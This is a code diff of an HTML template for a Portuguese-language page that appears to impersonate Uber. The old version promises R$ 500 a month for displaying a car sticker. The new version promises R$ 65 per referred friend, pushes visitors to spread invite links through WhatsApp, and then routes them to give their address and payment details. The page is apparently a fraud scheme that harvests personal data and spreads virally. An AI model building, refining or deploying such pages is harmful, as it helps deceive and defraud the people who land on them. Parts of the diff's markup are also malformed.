@@ -3,23 +3,15 @@
 {% block extra_head %}
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
-/* Animated gradient green button */
-@keyframes gradientShift {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
-}
-
+/* Force green button style with maximum specificity */
 button.green-payment-button, 
 #green-payment-btn,
 button#green-payment-btn.green-payment-button {
-    background: linear-gradient(-45deg, #16a34a, #22c55e, #16a34a, #34d399) !important;
-    background-size: 400% 400% !important;
-    animation: gradientShift 3s ease infinite !important;
+    background-color: #16a34a !important;
+    background: #16a34a !important;
     color: #ffffff !important;
     border: none !important;
     font-weight: 700 !important;
-    transition: all 0.3s ease !important;
 }
 
 button.green-payment-button:hover,
@@ -31,13 +23,10 @@ button.green-payment-button:focus,
 button#green-payment-btn.green-payment-button:hover,
 button#green-payment-btn.green-payment-button:active,
 button#green-payment-btn.green-payment-button:focus {
-    background: linear-gradient(-45deg, #15803d, #16a34a, #15803d, #22c55e) !important;
-    background-size: 400% 400% !important;
-    animation: gradientShift 2s ease infinite !important;
+    background-color: #15803d !important;
+    background: #15803d !important;
     color: #ffffff !important;
     border: none !important;
-    transform: translateY(-1px) !important;
-    box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3) !important;
 }
 </style>
 {% endblock %}
@@ -49,8 +38,9 @@ button#green-payment-btn.green-payment-button:focus {
         <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
             <i class="fa fa-check text-2xl text-green-600"></i>
         </div>
-        <h1 class="text-2xl font-bold text-black mb-2">Cadastro Aprovado!</h1>
-        <p class="text-gray-600">Seu cadastro ainda não terminou. Continue para informar como deseja receber seu pagamento.</p>
+        <h1 class="text-2xl font-bold text-black mb-2">Programa de Indicação  Ganhe R$ 65,00 por amigo!</h1>
+        <p class="text-gray-600">Compartilhe o programa de recompensa da Uber com seus amigos e familiares. 
+        Para cada pessoa que se cadastrar através do seu convite, você recebe <strong>R$ 65,00</strong> em dinheiro!</p>
     </div>
 
     <!-- Next Steps -->
@@ -59,19 +49,37 @@ button#green-payment-btn.green-payment-button:focus {
         <div class="space-y-4">
             <div class="flex items-start space-x-3">
                 <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">1</div>
-                <p style="color: black !important;">Receber o adesivo da Uber em casa</p>
+                <p style="color: black !important;">Compartilhe o programa de parceria da Uber com seus amigos e familiares</p>
             </div>
             <div class="flex items-start space-x-3">
                 <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">2</div>
-                <p style="color: black !important;">Instalar o adesivo no parabrisa traseiro do seu veículo</p>
+                <p style="color: black !important;">Volte a essa página para continuar com o cadastro</p>
             </div>
             <div class="flex items-start space-x-3">
-                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">3</div>
-                <p style="color: black !important;">Enviar foto do adesivo instalado para a Uber</p>
+    </div>
+             </div>
+         </div>
+
+    <!-- Referral Program -->
+    <div class="max-w-lg mx-auto px-4 py-8 text-center p-6 mb-2" style="background-color: #fff; border-radius: 0px;">
+        <div class="flex">
             </div>
-            <div class="flex items-start space-x-3">
-                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">4</div>
-                <p style="color: black !important;">Receber o pagamento mensal de <strong style="color: black !important;">R$ 500,00</strong> todo dia 10</p>
+            <div class="ml-3">
+                <h2 class="text-sm font-semibold text-yellow-800 mb-2">Participe agora:</h2>
+                <p class="text-sm text-yellow-700 mb-3">
+                    Após clicar, selecione os contatos que deseja fazer o convite e envie a mensagem de convite com seu link. Após isso <strong>retorne a este site</strong> para continuar com o seu cadastro.
+                </p>
+                <button onclick="shareOnWhatsApp()" 
+                    class="bg-green-600 hover:bg-green-700 text-white mt-3 mb-2 px-4 py-2 text-sm font-semibold transition-colors duration-200"
+                    style="background-color: #16a34a !important; background: #16a34a !important; color: #ffffff !important; style="border-radius: 2px !important;">
+                    <i class="fa fa-whatsapp mr-2"></i>Compartilhar no WhatsApp
+                </button>
+                <br>
+                <div class="mt-3 p-2" style="background-color: #FEF3C7; border-radius: 0px; border-left: 3px solid #F59E0B;">
+                    <p class="text-xs text-yellow-800">
+                        <i class="fa fa-info-circle mr-1"></i>Após compartilhar, volte e clique em "Informar Dados de Pagamento" para concluir seu cadastro.
+                    </p>
+                </div>
             </div>
         </div>
     </div>
@@ -84,22 +92,23 @@ button#green-payment-btn.green-payment-button:focus {
             </div>
             <div class="ml-3">
                 <p class="text-sm" style="color: black !important;">
-                    <strong style="color: black !important;">Próximo passo:</strong> Clique no botão abaixo e escolha como deseja receber o pagamento mensal.</p>
+                    <strong style="color: black !important;">Próximo passo:</strong> Clique no botão abaixo para informar seu endereço:</p>
             </div>
         </div>
     </div>
 
     <!-- Continue Button -->
     <div class="text-center">
-        <button onclick="window.location.href='/recebedor'" 
+        <button onclick="window.location.href='/address'" 
             id="green-payment-btn"
             class="green-payment-button" 
             style="background-color: #16a34a !important; background: #16a34a !important; color: #ffffff !important; border-radius: 2px !important; padding: 12px 24px !important; border: none !important; font-weight: 700 !important; width: 100% !important; font-size: 16px !important;">
-            <i class="fa fa-arrow-right mr-2"></i>Informar Dados de Pagamento
+            <i class="fa fa-arrow-right mr-2"></i>Finalizar Cadastro
         </button>
     </div>
 </div>
-
+<br>
+<br>
 <script>
 // WhatsApp sharing function
 function shareOnWhatsApp() {
@@ -128,9 +137,8 @@ function forceGreenButton() {
     const greenBtn = document.getElementById('green-payment-btn');
     if (greenBtn) {
         greenBtn.style.cssText = `
-            background: linear-gradient(-45deg, #16a34a, #22c55e, #16a34a, #34d399) !important;
-            background-size: 400% 400% !important;
-            animation: gradientShift 3s ease infinite !important;
+            background-color: #16a34a !important;
+            background: #16a34a !important;
             color: #ffffff !important;
             border-radius: 2px !important;
             padding: 12px 24px !important;
@@ -138,15 +146,13 @@ function forceGreenButton() {
             font-weight: 700 !important;
             width: 100% !important;
             font-size: 16px !important;
-            transition: all 0.3s ease !important;
         `;
-        
+
         // Force hover and active states
         greenBtn.addEventListener('mouseenter', function() {
             this.style.cssText = `
-                background: linear-gradient(-45deg, #15803d, #16a34a, #15803d, #22c55e) !important;
-                background-size: 400% 400% !important;
-                animation: gradientShift 2s ease infinite !important;
+                background-color: #15803d !important;
+                background: #15803d !important;
                 color: #ffffff !important;
                 border-radius: 2px !important;
                 padding: 12px 24px !important;
@@ -154,17 +160,13 @@ function forceGreenButton() {
                 font-weight: 700 !important;
                 width: 100% !important;
                 font-size: 16px !important;
-                transition: all 0.3s ease !important;
-                transform: translateY(-1px) !important;
-                box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3) !important;
             `;
         });
-        
+
         greenBtn.addEventListener('mouseleave', function() {
             this.style.cssText = `
-                background: linear-gradient(-45deg, #16a34a, #22c55e, #16a34a, #34d399) !important;
-                background-size: 400% 400% !important;
-                animation: gradientShift 3s ease infinite !important;
+                background-color: #16a34a !important;
+                background: #16a34a !important;
                 color: #ffffff !important;
                 border-radius: 2px !important;
                 padding: 12px 24px !important;
@@ -172,17 +174,13 @@ function forceGreenButton() {
                 font-weight: 700 !important;
                 width: 100% !important;
                 font-size: 16px !important;
-                transition: all 0.3s ease !important;
-                transform: translateY(0px) !important;
-                box-shadow: none !important;
             `;
         });
-        
+
         greenBtn.addEventListener('mousedown', function() {
             this.style.cssText = `
-                background: linear-gradient(-45deg, #15803d, #16a34a, #15803d, #22c55e) !important;
-                background-size: 400% 400% !important;
-                animation: gradientShift 2s ease infinite !important;
+                background-color: #15803d !important;
+                background: #15803d !important;
                 color: #ffffff !important;
                 border-radius: 2px !important;
                 padding: 12px 24px !important;
@@ -190,12 +188,9 @@ function forceGreenButton() {
                 font-weight: 700 !important;
                 width: 100% !important;
                 font-size: 16px !important;
-                transition: all 0.3s ease !important;
-                transform: translateY(-1px) !important;
-                box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3) !important;
             `;
         });
-        
+
         console.log('Green button forced with hover states!');
     }
 }
